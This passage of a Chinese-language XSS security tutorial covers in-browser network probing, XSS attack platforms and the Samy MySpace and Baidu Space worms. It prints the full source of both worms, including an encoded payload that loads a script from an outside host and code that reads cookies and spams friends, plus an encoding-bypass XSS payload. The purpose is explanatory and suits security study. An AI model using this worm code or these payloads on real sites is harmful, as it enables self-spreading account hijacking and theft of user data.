class="string">'127.0.0.1'</span>;</div><div class="line">  &#125;;</div><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">  <span class="comment">//此外，还有两个利用Java获取本地网络信息的API：</span></div><div class="line"></div><div class="line">  <span class="comment">/**</span></div><div class="line">    * <span class="doctag">@cat</span> DOM</div><div class="line">    * <span class="doctag">@name</span> AttackAPI.dom.getInternalHostname</div><div class="line">    * <span class="doctag">@desc</span> get internal hostname</div><div class="line">    * <span class="doctag">@return</span> &#123;String&#125; hostname</div><div class="line">   */</div><div class="line"></div><div class="line">  AttackAPI.dom.getInternalHostname = function () &#123;</div><div class="line">       <span class="keyword">try</span> &#123;</div><div class="line">               var sock = <span class="keyword">new</span> java.net.Socket();</div><div class="line"></div><div class="line">               sock.bind(<span class="keyword">new</span> java.net.InetSocketAddress(<span class="string">'0.0.0.0'</span>, <span class="number">0</span>));</div><div class="line">               sock.connect(<span class="keyword">new</span> java.net.InetSocketAddress(document.domain,</div><div class="line">  (!document.location.port)?<span class="number">80</span>:document.location.port));</div><div class="line"></div><div class="line">               <span class="keyword">return</span> sock.getLocalAddress().getHostName();</div><div class="line">       &#125; <span class="keyword">catch</span> (e) &#123;&#125;</div><div class="line">       <span class="keyword">return</span> <span class="string">'localhost'</span>;</div><div class="line">  &#125;;</div><div class="line"></div><div class="line"><span class="comment">/**</span></div><div class="line">  * <span class="doctag">@cat</span> DOM</div><div class="line">  * <span class="doctag">@name</span> AttackAPI.dom.getInternalNetworkInfo</div><div class="line">  * <span class="doctag">@desc</span> get the internal network information</div><div class="line">  * <span class="doctag">@return</span> &#123;Object&#125; network information object</div><div class="line">  */</div><div class="line"></div><div class="line">  AttackAPI.dom.getInternalNetworkInfo = function () &#123;</div><div class="line">       var info = &#123;hostname: <span class="string">'localhost'</span>, IP: <span class="string">'127.0.0.1'</span>&#125;;</div><div class="line"></div><div class="line">       <span class="keyword">try</span> &#123;</div><div class="line">               var sock = <span class="keyword">new</span> java.net.Socket();</div><div class="line"></div><div class="line">               sock.bind(<span class="keyword">new</span> java.net.InetSocketAddress(<span class="string">'0.0.0.0'</span>, <span class="number">0</span>));</div><div class="line">               sock.connect(<span class="keyword">new</span> java.net.InetSocketAddress(document.domain,</div><div class="line">  (!document.location.port)?<span class="number">80</span>:document.location.port));</div><div class="line"></div><div class="line">               info.IP = sock.getLocalAddress().getHostAddress();</div><div class="line">               info.hostname = sock.getLocalAddress().getHostName();</div><div class="line">       &#125; <span class="keyword">catch</span> (e) &#123;&#125;</div><div class="line"></div><div class="line">       <span class="keyword">return</span> info;</div><div class="line">  &#125;;</div></pre></td></tr></table></figure>
<p>  这种方法需要攻击者写一个Java Class，嵌入到当前页面中。除了Java之外，一些ActiveX控件可能也会提供接口查询本地IP地址。这些功能比较特殊，需要根据具体情况具体分析，这里不赘述了。</p>
<p>  Metasploit引擎曾展示过一个强大的测试页面，综合了Java Applet、Flash、iTunes、Office Word、QuickTime等第三方软件的功能，抓取用户的本地信息，有兴趣深入研究的读者可以参考。</p>
<p><hr></p>
<h3 id="3-2-3-XSS-攻击平台"><a href="#3-2-3-XSS-攻击平台" class="headerlink" title="3.2.3 XSS 攻击平台"></a>3.2.3 XSS 攻击平台</h3><p>XSS Payload如此强大，为了使用方便，有安全研究者将许多功能封装起来，成为XSS攻击平台。这些攻击平台的主要目的是为了演示XSS的危害，以及方便渗透测试使用。下面就介绍几个常见的XSS攻击平台。</p>
<h3 id="Attack-API"><a href="#Attack-API" class="headerlink" title="Attack API"></a>Attack API</h3><p>Attack API是安全研究者pdp所主导的一个项目，它总结了很多能够直接使用XSS Payload，归纳为API的方式。比如上节提到的“获取客户端本地信息的API”就出自这个项目。<br>BeEF<br>BeEF曾经是最好的XSS演示平台。不同于Attack API，BeEF所演示的是一个完整的XSS攻击过程。BeEF有一个控制后台，攻击者可以在后台控制前端的一切。</p>
<p>每个被XSS攻击的用户都将出现在后台，后台控制者可以控制这些浏览器的行为，并可以通过XSS向这些用户发送命令。</p>
<h3 id="XSS-Proxy"><a href="#XSS-Proxy" class="headerlink" title="XSS-Proxy"></a>XSS-Proxy</h3><p>XSS-Proxy是一个轻量级的XSS攻击平台，通过嵌套iframe的方式可以实时地远程控制被XSS攻击的浏览器。<br>XSS-Proxy的实现原理<br>这些XSS攻击平台有助于深入理解XSS的原理和危害。</p>
<h3 id="3-2-4-终极武器：XSS-Worm"><a href="#3-2-4-终极武器：XSS-Worm" class="headerlink" title="3.2.4 终极武器：XSS Worm"></a>3.2.4 终极武器：XSS Worm</h3><p>终极武器：XSS Worm</p>
<p>XSS也能形成蠕虫吗？我们知道，以往的蠕虫是利用服务器端软件漏洞进行传播的。比如2003年的冲击波蠕虫，利用的是Windows的RPC远程溢出漏洞。</p>
<p>Samy Worm</p>
<p>在2005年，年仅19岁的Samy Kamkar发起了对MySpace.com的XSS Worm攻击。Samy Kamkar的蠕虫在短短几小时内就感染了100万用户——它在每个用户的自我简介后边加了一句话：“but most of all, Samy is my hero.”（Samy是我的偶像）。这是Web安全史上第一个重量级的XSS Worm，具有里程碑意义。</p>
<p>今天我们看看当时的Samy蠕虫都做了些什么？</p>
<p>首先，MySpace过滤了很多危险的HTML标签，只保留了<code>&lt;a&gt;标签</code>、<code>&lt;img&gt;标签</code>、<code>&lt;div&gt;标签</code>等“安全的标签”。所有的事件比如“onclick”等也被过滤了。但是MySpace却允许用户控制标签的style属性，通过style，还是有办法构造出XSS的。比如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">&lt;div style=&quot;background:url(&apos;javascript:alert(1)&apos;)&quot;&gt;</div></pre></td></tr></table></figure>
<p>其次，MySpace同时还过滤了<code>javascript</code>、<code>onreadystatechange</code>等敏感词，所以Samy用了“拆分法”绕过这些限制。<br>最后，Samy通过AJAX构造的POST请求，完成了在用户的heros列表里添加自己名字的功能；同时复制蠕虫自身进行传播。至此，XSS Worm就完成了。有兴趣的读者可以参考Samy蠕虫的技术细节分析。</p>
<p>下面附上Samy Worm的源代码。这是具有里程碑意义的第一个XSS Worm，原本的代码压缩在一行内。为了方便阅读，如下代码已经经过了整理和美化。</p>
<figure class="highlight html"><table><tr><td class="code"><pre><div class="line"></div><div class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">id</span>=<span class="string">mycode</span> <span class="attr">style</span>=<span class="string">"BACKGROUND: url('javascript:eval(document.all.mycode.expr)')"</span></span></div><div class="line">    <span class="attr">expr</span>=<span class="string">"var B=String.fromCharCode(34);</span></div><div class="line">    var A=String.fromCharCode(39);</div><div class="line">    function g()&#123;</div><div class="line">      var C;</div><div class="line">      try&#123;</div><div class="line">        var D=document.body.createTextRange();</div><div class="line">        C=D.htmlText</div><div class="line">      &#125;catch(e)&#123;</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      if(C)&#123;</div><div class="line">        return C</div><div class="line">      &#125;else&#123;</div><div class="line">      return eval('document.body.inne'+'rHTML')</div><div class="line">      &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    function getData(AU)&#123;</div><div class="line">      M=getFromURL(AU,'friendID');</div><div class="line">      L=getFromURL(AU,'Mytoken')</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    function getQueryParams()&#123;</div><div class="line">      var E=document.location.search;</div><div class="line">      var F=E.substring(1,E.length).split('&amp;');</div><div class="line">      var AS=new Array();</div><div class="line"></div><div class="line">      for(var O=0;O&lt;F.length;O++)&#123;</div><div class="line">        var I=F[O].split('=');</div><div class="line">        AS[I[0]]=I[1]&#125;return AS</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      var J;</div><div class="line">      var AS=getQueryParams();</div><div class="line">      var L=AS['Mytoken'];</div><div class="line">      var M=AS['friendID'];</div><div class="line"></div><div class="line">      if(location.hostname=='profile.myspace.com')&#123;</div><div class="line">        document.location='http://www.myspace.com'+location.pathname+location.search</div><div class="line">      &#125;else&#123;</div><div class="line">        if(!M)&#123;</div><div class="line">          getData(g())</div><div class="line">        &#125;</div><div class="line">        main()</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      function getClientFID()&#123;</div><div class="line">        return findIn(g(),'up_launchIC( '+A,A)</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      function nothing()&#123;&#125;</div><div class="line"></div><div class="line">      function paramsToString(AV)&#123;</div><div class="line">        var N=new String();</div><div class="line">        var O=0;</div><div class="line">        for(var P in AV)&#123;</div><div class="line">          if(O&gt;0)&#123;</div><div class="line">            N+='&amp;'</div><div class="line">          &#125;</div><div class="line">          var Q=escape(AV[P]);</div><div class="line"></div><div class="line">          while(Q.indexOf('+')!=-1)&#123;</div><div class="line">            Q=Q.replace('+','%2B')</div><div class="line">          &#125;</div><div class="line"></div><div class="line">          while(Q.indexOf('&amp;')!=-1)&#123;</div><div class="line">            Q=Q.replace('&amp;','%26')</div><div class="line">          &#125;</div><div class="line"></div><div class="line">          N+=P+'='+Q;</div><div class="line">          O++</div><div class="line">        &#125;</div><div class="line">        return N</div><div class="line">      &#125;</div><div class="line">      function httpSend(BH,BI,BJ,BK)&#123;</div><div class="line">        if(!J)&#123;</div><div class="line">          return false</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        eval('J.onr'+'eadystatechange=BI');</div><div class="line"></div><div class="line">        J.open(BJ,BH,true);</div><div class="line"></div><div class="line">        if(BJ=='POST')&#123;</div><div class="line">          J.setRequestHeader('Content-Type','application/x-www-form-urlencoded');</div><div class="line">          J.setRequestHeader('Content-Length',BK.length)</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        J.send(BK);</div><div class="line"></div><div class="line">        return true</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      function findIn(BF,BB,BC)&#123;</div><div class="line">        var R=BF.indexOf(BB)+BB.length;</div><div class="line">        var S=BF.substring(R,R+1024);</div><div class="line">        return S.substring(0,S.indexOf(BC))</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      function getHiddenParameter(BF,BG)&#123;</div><div class="line">        return findIn(BF,'name='+B+BG+B+' value='+B,B)</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      function getFromURL(BF,BG)&#123;</div><div class="line">        var T;</div><div class="line">        if(BG=='Mytoken')&#123;</div><div class="line">          T=B</div><div class="line">        &#125;else&#123;</div><div class="line">          T='&amp;'</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        var U=BG+'=';</div><div class="line">        var V=BF.indexOf(U)+U.length;</div><div class="line">        var W=BF.substring(V,V+1024);</div><div class="line">        var X=W.indexOf(T);</div><div class="line">        var Y=W.substring(0,X);</div><div class="line">        return Y</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      function getXMLObj()&#123;</div><div class="line">        var Z=false;</div><div class="line">        if(window.XMLHttpRequest)&#123;</div><div class="line">          try&#123;</div><div class="line">            Z=new XMLHttpRequest()</div><div class="line">          &#125;catch(e)&#123;</div><div class="line">            Z=false</div><div class="line">          &#125;</div><div class="line">        &#125;else if(window.ActiveXObject)&#123;</div><div class="line">          try&#123;</div><div class="line">            Z=new ActiveXObject('Msxml2.XMLHTTP')</div><div class="line">          &#125;catch(e)&#123;</div><div class="line">            try&#123;</div><div class="line">              Z=new ActiveXObject('Microsoft.XMLHTTP')</div><div class="line">            &#125;catch(e)&#123;</div><div class="line">              Z=false</div><div class="line">            &#125;</div><div class="line">          &#125;</div><div class="line">        &#125;</div><div class="line">        return Z</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      var AA=g();</div><div class="line">      var AB=AA.indexOf('m'+'ycode');</div><div class="line">      var AC=AA.substring(AB,AB+4096);</div><div class="line">      var AD=AC.indexOf('D'+'IV');</div><div class="line">      var AE=AC.substring(0,AD);</div><div class="line">      var AF;</div><div class="line"></div><div class="line">      if(AE)&#123;</div><div class="line">        AE=AE.replace('jav'+'a',A+'jav'+'a');</div><div class="line">        AE=AE.replace('exp'+'r)','exp'+'r)'+A);</div><div class="line">        AF=' but most of all, samy is my hero. &lt;d'+'iv id='+AE+'D'+'IV&gt;'</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      var AG;</div><div class="line"></div><div class="line">      function getHome()&#123;</div><div class="line">        if(J.readyState!=4)&#123;</div><div class="line">          return</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        var AU=J.responseText;</div><div class="line">        AG=findIn(AU,'P'+'rofileHeroes','&lt;/td&gt;');</div><div class="line">        AG=AG.substring(61,AG.length);</div><div class="line"></div><div class="line">        if(AG.indexOf('samy')==-1)&#123;</div><div class="line">          if(AF)&#123;</div><div class="line">            AG+=AF;</div><div class="line">            var AR=getFromURL(AU,'Mytoken');</div><div class="line">            var AS=new Array();</div><div class="line">            AS['interestLabel']='heroes';</div><div class="line">            AS['submit']='Preview';</div><div class="line">            AS['interest']=AG;</div><div class="line">            J=getXMLObj();</div><div class="line">            httpSend('/index.cfm?fuseaction=profile.previewInterests&amp;Mytoken='+AR,postHero,</div><div class="line">'POST',paramsToString(AS))</div><div class="line">          &#125;</div><div class="line">        &#125;</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      function postHero()&#123;</div><div class="line">        if(J.readyState!=4)&#123;</div><div class="line">          return</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        var AU=J.responseText;</div><div class="line">        var AR=getFromURL(AU,'Mytoken');</div><div class="line">        var AS=new Array();</div><div class="line">        AS['interestLabel']='heroes';</div><div class="line">        AS['submit']='Submit';</div><div class="line">        AS['interest']=AG;</div><div class="line">        AS['hash']=getHiddenParameter(AU,'hash');</div><div class="line">        httpSend('/index.cfm?fuseaction=profile.processInterests&amp;Mytoken='+AR,nothing,</div><div class="line">'POST',paramsToString(AS))</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      function main()&#123;</div><div class="line">        var AN=getClientFID();</div><div class="line">        var BH='/index.cfm?fuseaction=user.viewProfile&amp;friendID='+AN+'&amp;Mytoken='+L;</div><div class="line">        J=getXMLObj();</div><div class="line">        httpSend(BH,getHome,'GET');</div><div class="line">        xmlhttp2=getXMLObj();</div><div class="line">        httpSend2('/index.cfm?fuseaction=invite.addfriend_verify&amp;friendID=11851658&amp;</div><div class="line">Mytoken=' +L,processxForm,'GET')</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      function processxForm()&#123;</div><div class="line">        if(xmlhttp2.readyState!=4)&#123;</div><div class="line">        return</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      var AU=xmlhttp2.responseText;</div><div class="line">      var AQ=getHiddenParameter(AU,'hashcode');</div><div class="line">      var AR=getFromURL(AU,'Mytoken');</div><div class="line">      var AS=new Array();</div><div class="line">      AS['hashcode']=AQ;</div><div class="line">      AS['friendID']='11851658';</div><div class="line">      AS['submit']='Add to Friends';</div><div class="line">      httpSend2('/index.cfm?fuseaction=invite.addFriendsProcess&amp;Mytoken='+AR,nothing,</div><div class="line">'POST',paramsToString(AS))</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    function httpSend2(BH,BI,BJ,BK)&#123;</div><div class="line">      if(!xmlhttp2)&#123;</div><div class="line">        return false</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      eval('xmlhttp2.onr'+'eadystatechange=BI');</div><div class="line">      xmlhttp2.open(BJ,BH,true);</div><div class="line"></div><div class="line">      if(BJ=='POST')&#123;</div><div class="line">        xmlhttp2.setRequestHeader('Content-Type','application/x-www-form-urlencoded');</div><div class="line">        xmlhttp2.setRequestHeader('Content-Length',BK.length)&#125;</div><div class="line">        xmlhttp2.send(BK);</div><div class="line">        return true</div><div class="line">      &#125;"&gt;</div><div class="line">    <span class="tag">&lt;/<span class="name">DIV</span>&gt;</span></div></pre></td></tr></table></figure>
<p>XSS Worm是XSS的一种终极利用方式，它的破坏力和影响力是巨大的。但是发起XSS Worm攻击也有一定的条件。</p>
<p>一般来说，用户之间发生交互行为的页面，如果存在存储型XSS，则比较容易发起XSS Worm攻击。</p>
<p>发送站内信、用户留言等页面，都是XSS Worm的高发区，需要重点关注。而相对的，如果一个页面只能由用户个人查看，比如“用户个人资料设置”页面，因为缺乏用户之间互动的功能，所以即使存在XSS，也不能被用于XSS Worm的传播。</p>
<p>下面这个XSS Worm的案例来自百度。</p>
<p>2007年12月，百度空间的用户忽然互相之间开始转发垃圾短消息，后来百度工程师紧急修复了这一漏洞：</p>
<p>百度空间的XSS蠕虫公告</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">这次事件，是由XSS Worm造成的。时任百度系统部高级安全顾问的方小顿，分析了这个蠕虫的技术细节，他在文中写到：</div><div class="line">上面基本就是代码，总体来说，还是很有意思的。</div><div class="line">首先就是漏洞，过滤多一个字符都不行，甚至挪一个位置都不行（上面的Playload部分）。这个虫子比较特殊的地方是感染IE用户，对其他用户无影响；另外就是完全可以隐蔽地传播，因为只是在CSS中加代码并不会有什么明显的地方，唯一的缺陷是有点卡。所以，完全可以长时间地存在，感染面不限制于blog，存在CSS的地方都可以，譬如Profile。</div><div class="line">另外比较强大的一点就是跟真正的虫子一样，不只是被动地等待，选择在好友发消息时引诱别人过来访问自己的blog，利用好奇心可以做到这点。</div><div class="line">最后还加了个给在线人随机发消息请求加链接，威力可能更大，因为会创造比较大的基数，这样一感染就是一个blog。</div><div class="line">到Baidu封锁时，这个虫子已经感染了8700多个blog。总体来说还不错，本来想作为元旦的一个贺礼，不过还是提前死掉了。可以看到，在代码和流程里运用了很多系统本身就有的特性，自己挖掘吧。</div></pre></td></tr></table></figure>
<p>这个百度XSS Worm的源代码如下：</p>
<figure class="highlight"><table><tr><td class="code"><pre><div class="line">window.onerror = killErrors;</div><div class="line">execScript(unescape('Function%20URLEncoding%28vstrIn%29%0A%20%20%20%20strReturn%20%3D</div><div class="line">%20%22%22%0A%20%20%20%20For%20aaaa%20%3D%201%20To%20Len%28vstrIn%29%0A%20%20%20%20%20</div><div class="line">%20%20%20ThisChr%20%3D%20Mid%28vStrIn%2Caaaa%2C1%29%0A%20%20%20%20%20%20%20%20If%20Ab</div><div class="line">s%28Asc%28ThisChr%29%29%20%3C%20%26HFF%20Then%0A%20%20%20%20%20%20%20%20%20%20%20%20s</div><div class="line">trReturn%20%3D%20strReturn%20%26%20ThisChr%0A%20%20%20%20%20%20%20%20Else%0A%20%20%20</div><div class="line">%20%20%20%20%20%20%20%20%20innerCode%20%3D%20Asc%28ThisChr%29%0A%20%20%20%20%20%20%20</div><div class="line">%20%20%20%20%20If%20innerCode%20%3C%200%20Then%0A%20%20%20%20%20%20%20%20%20%20%20%20</div><div class="line">%20%20%20%20innerCode%20%3D%20innerCode%20+%20%26H10000%0A%20%20%20%20%20%20%20%20%20</div><div class="line">%20%20%20End%20If%0A%20%20%20%20%20%20%20%20%20%20%20%20Hight8%20%3D%20%28innerCode%2</div><div class="line">0%20And%20%26HFF00%29%5C%20%26HFF%0A%20%20%20%20%20%20%20%20%20%20%20%20Low8%20%3D%20</div><div class="line">innerCode%20And%20%26HFF%0A%20%20%20%20%20%20%20%20%20%20%20%20strReturn%20%3D%20strR</div><div class="line">eturn%20%26%20%22%25%22%20%26%20Hex%28Hight8%29%20%26%20%20%22%25%22%20%26%20Hex%28Lo</div><div class="line">w8%29%0A%20%20%20%20%20%20%20%20End%20If%0A%20%20%20%20Next%0A%20%20%20%20URLEncoding</div><div class="line">%20%3D%20strReturn%0AEnd%20Function'),'VBScript');</div><div class="line">cookie='';</div><div class="line">cookieval=document.cookie;</div><div class="line">spaceid=spaceurl;</div><div class="line">myhibaidu="http://hi.baidu.com"+spaceid;</div><div class="line">xmlhttp=poster();</div><div class="line">debug=0;</div><div class="line"></div><div class="line">online();</div><div class="line"></div><div class="line">if(spaceid!='/') &#123;</div><div class="line">  if(debug==1) &#123;</div><div class="line">    goteditcss();</div><div class="line">    document.cookie='xssshell/owned/you!';</div><div class="line">  &#125;</div><div class="line">  if(cookieval.indexOf('xssshell')==-1) &#123;</div><div class="line">    goteditcss();</div><div class="line">    document.cookie='xssshell/owned/you!';</div><div class="line">  &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function makeevilcss(spaceid,editurl,use)&#123;</div><div class="line">  playload="a&#123;evilmask:ex/*exp/**/ression*/pression(execScript(unescape('d%253D%2522doc</div><div class="line">  %2522%252B%2522ument%2522%253B%250D%250Ai%253D%2522function%2520load%2528%2529%257Bva</div><div class="line">  r%2520x%253D%2522%252Bd%252B%2522.createElement%2528%2527SCRIPT%2527%2529%253Bx.src%2</div><div class="line">  53D%2527http%253A//www.18688.com/cache/1.js%2527%253Bx.defer%253Dtrue%253B%2522%252Bd</div><div class="line">  %252B%2522.getElementsByTagName%2528%2527HEAD%2527%2529%255B0%255D.appendChild%2528x%</div><div class="line">  2529%257D%253Bfunction%2520inject%2528%2529%257Bwindow.setTimeout%2528%2527load%2528%</div><div class="line">  2529%2527%252C1000%2529%257D%253Bif%2528window.x%2521%253D1%2529%257Bwindow.x%253D1%2</div><div class="line">  53Binject%2528%2529%257D%253B%2522%250D%250AexecScript%2528i%2529')))&#125;";</div><div class="line">  action=myhibaidu+"/commit";</div><div class="line">  spCssUse=use;</div><div class="line">  s=getmydata(editurl);</div><div class="line"></div><div class="line">  re = /\&lt;input type=\"hidden\" id=\"ct\" name=\"ct\" value=\"(.*?)\"/i;</div><div class="line">  ct = s.match(re);</div><div class="line">  ct=(ct[1]);</div><div class="line"></div><div class="line">  re = /\&lt;input type=\"hidden\" id=\"cm\" name=\"cm\" value=\"(.*?)\"/i;</div><div class="line">  cm = s.match(re);</div><div class="line">  cm=(cm[1])/1+1;</div><div class="line"></div><div class="line">  re = /\&lt;input type=\"hidden\" id=\"spCssID\" name=\"spCssID\" value=\"(.*?)\"/i;</div><div class="line">  spCssID = s.match(re);</div><div class="line">  spCssID=(spCssID[1]);</div><div class="line"></div><div class="line">  spRefUrl=editurl;</div><div class="line"></div><div class="line">  re = /\&lt;textarea(.*?)\&gt;([^\x00]*?)\&lt;\/textarea\&gt;/i;</div><div class="line">  spCssText = s.match(re);</div><div class="line">  spCssText=spCssText[2];</div><div class="line">  spCssText=URLEncoding(spCssText);</div><div class="line"></div><div class="line">  if(spCssText.indexOf('evilmask')!==-1) &#123;</div><div class="line">    return 1;</div><div class="line">  &#125;</div><div class="line">  else spCssText=spCssText+"\r\n\r\n"+playload;</div><div class="line"></div><div class="line">  re = /\&lt;input name=\"spCssName\"(.*?)value=\"(.*?)\"&gt;/i;</div><div class="line">  spCssName = s.match(re);</div><div class="line">  spCssName=spCssName[2];</div><div class="line"></div><div class="line">  re = /\&lt;input name=\"spCssTag\"(.*?)value=\"(.*?)\"&gt;/i;</div><div class="line">  spCssTag = s.match(re);</div><div class="line">  spCssTag=spCssTag[2];</div><div class="line"></div><div class="line">  postdata="ct="+ct+"&amp;spCssUse=1"+"&amp;spCssColorID=1"+"&amp;spCssLayoutID=-1"+"&amp;spRefURL="+UR</div><div class="line">  LEncoding(spRefUrl)+"&amp;spRefURL="+URLEncoding(spRefUrl)+"&amp;cm="+cm+"&amp;spCssID="+spCssID+</div><div class="line">  "&amp;spCssText="+spCssText+"&amp;spCssName="+URLEncoding(spCssName)+"&amp;spCssTag="+URLEncoding</div><div class="line">  (spCssTag);</div><div class="line">  result=postmydata(action,postdata);</div><div class="line">  sendfriendmsg();</div><div class="line">  count();</div><div class="line">  hack();</div><div class="line">&#125;</div><div class="line"></div><div class="line">function goteditcss() &#123;</div><div class="line">  src="http://hi.baidu.com"+spaceid+"/modify/spcrtempl/0";</div><div class="line">  s=getmydata(src);</div><div class="line">  re = /\&lt;link rel=\"stylesheet\" type=\"text\/css\"</div><div class="line">  href=\"(.*?)\/css\/item\/(.*?)\.css\"&gt;/i;</div><div class="line">  r = s.match(re);</div><div class="line">  nowuse=r[2];</div><div class="line">  makeevilcss(spaceid,"http://hi.baidu.com"+spaceid+"/modify/spcss/"+nowuse+".css/edit"</div><div class="line">  ,1);</div><div class="line">  return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function poster()&#123;</div><div class="line">  var request = false;</div><div class="line">  if(window.XMLHttpRequest) &#123;</div><div class="line">    request = new XMLHttpRequest();</div><div class="line">    if(request.overrideMimeType) &#123;</div><div class="line">      request.overrideMimeType('text/xml');</div><div class="line">    &#125;</div><div class="line">  &#125; else if(window.ActiveXObject) &#123;</div><div class="line">    var versions = ['Microsoft.XMLHTTP', 'MSXML.XMLHTTP', 'Microsoft.XMLHTTP',</div><div class="line">    'Msxml2.XMLHTTP.7.0', 'Msxml2.XMLHTTP.6.0', 'Msxml2.XMLHTTP.5.0', 'Msxml2.XMLHTTP.4.0',</div><div class="line">    'MSXML2.XMLHTTP.3.0', 'MSXML2.XMLHTTP'];</div><div class="line">    for(var i=0; i&lt;versions.length; i++) &#123;</div><div class="line">      try &#123;</div><div class="line">        request = new ActiveXObject(versions[i]);</div><div class="line">      &#125; catch(e) &#123;&#125;</div><div class="line">    &#125;</div><div class="line">  &#125;</div><div class="line">  return request;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function postmydata(action,data)&#123;</div><div class="line">  xmlhttp.open("POST", action, false);</div><div class="line">  xmlhttp.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');</div><div class="line">  xmlhttp.send(data);</div><div class="line">  return xmlhttp.responseText;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function getmydata(action)&#123;</div><div class="line">  xmlhttp.open("GET", action, false);</div><div class="line">  xmlhttp.send();</div><div class="line">  return xmlhttp.responseText;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function killErrors() &#123;</div><div class="line">  return true;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function count() &#123;</div><div class="line">  a=new Image();</div><div class="line">  a.src='http://img.users.51.la/1563171.asp';</div><div class="line">  return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function online() &#123;</div><div class="line">  online=new Image();</div><div class="line">  online.src='http://img.users.51.la/1563833.asp ';</div><div class="line">  return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function hack() &#123;</div><div class="line">  return 0;</div><div class="line">&#125;</div><div class="line"></div><div class="line">function sendfriendmsg()&#123;</div><div class="line">  myfurl=myhibaidu+"/friends";</div><div class="line">  s=getmydata(myfurl);</div><div class="line">  evilmsg="哈，节日快乐呀!热烈庆祝2008，心情好好，记得要想我呀！</div><div class="line">  \r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n\r\n"+myhibai</div><div class="line">  du;</div><div class="line"></div><div class="line">  var D=function(A,B)&#123;A[A.length]=B;&#125;;</div><div class="line">  re = /(.+)D\(k\,\[([^\]]+?)\]\)(.*)/g;</div><div class="line">  friends = s.match(re);</div><div class="line">  eval(friends[0]);</div><div class="line">  for(i in k) &#123;</div><div class="line">    eval('msgimg'+i+'=new Image();');</div><div class="line">    eval('msgimg'+i+'.src="http://msg.baidu.com/?ct=22&amp;cm=MailSend&amp;tn=bmSubmit&amp;sn="+URLE</div><div class="line">    ncoding(k[i][2])+"&amp;co="+URLEncoding(evilmsg)+"&amp;vcodeinput=";');</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>后来又增加了一个传播函数，不过那个时候百度已经开始屏蔽此蠕虫了：</p>
<figure class="highlight"><table><tr><td class="code"><pre><div class="line">function onlinemsg()&#123;</div><div class="line">  doit=Math.floor(Math.random() * (600 + 1));</div><div class="line">  if(doit&gt;500) &#123;</div><div class="line">    evilonlinemsg="哈哈,还记得我不,加个友情链接吧?\r\n\r\n\r\n我的地址是"+myhibaidu;</div><div class="line">    xmlDoc=new ActiveXObject("Microsoft.XMLDOM");</div><div class="line">    xmlDoc.async=false;</div><div class="line">    xmlDoc.load("http://hi.baidu.com/sys/file/moreonline.xml");</div><div class="line">    online=xmlDoc.documentElement;</div><div class="line">    users=online.getElementsByTagName("id");</div><div class="line">    x=Math.floor(Math.random() * (200 + 1));</div><div class="line">    eval('msgimg'+x+'=new Image();');</div><div class="line">    eval('msgimg'+x+'.src="http://msg.baidu.com/?ct=22&amp;cm=MailSend&amp;tn=bmSubmit&amp;sn=</div><div class="line">    "+URLEncoding(users[x].text)+"&amp;co="+URLEncoding(evilonlinemsg)+"&amp;vcodeinput=";');</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>攻击者想要通过XSS做坏事是很容易的，而XSS Worm则能够把这种破坏无限扩大，这正是大型网站所特别担心的事情</p>
<p>无论是MySpace蠕虫，还是百度空间的蠕虫，都是“善意”的蠕虫，它们只是在“恶作剧”，而没有真正形成破坏。真正可怕的蠕虫，是那些在无声无息地窃取用户数据、骗取密码的“恶意”蠕虫，这些蠕虫并不会干扰用户的正常使用，非常隐蔽。</p>
<p><hr></p>
<h3 id="3-2-6-XSS构造技巧"><a href="#3-2-6-XSS构造技巧" class="headerlink" title="3.2.6 XSS构造技巧"></a>3.2.6 XSS构造技巧</h3><p>“百度搜藏”曾经出现过一个这样的XSS漏洞。百度在一个<code>&lt;script&gt;</code>标签中输出了一个变量，其中转义了双引号：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">var redirectUrl=&quot;\&quot;;</div><div class="line">alert(/XSS/);&quot;;</div></pre></td></tr></table></figure>
<p>一般来说，这里是没有XSS漏洞的，因为变量处于双引号之内，系统转义了双引号导致变量无法<kbd> <code>escape</code> </kbd>。</p>
<p>但是，百度的返回页面是<kbd>GBK/GB2312</kbd>编码的，因此<kbd><code>%c1\</code> </kbd> 这两个字符组合在一起后，会成为一个Unicode字符。在Firefox下会认为这是一个字符，所以构造：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><div class="line">%c1&quot;;alert(/XSS/);//</div></pre></td></tr></table></figure>
<p>并提交：</p>
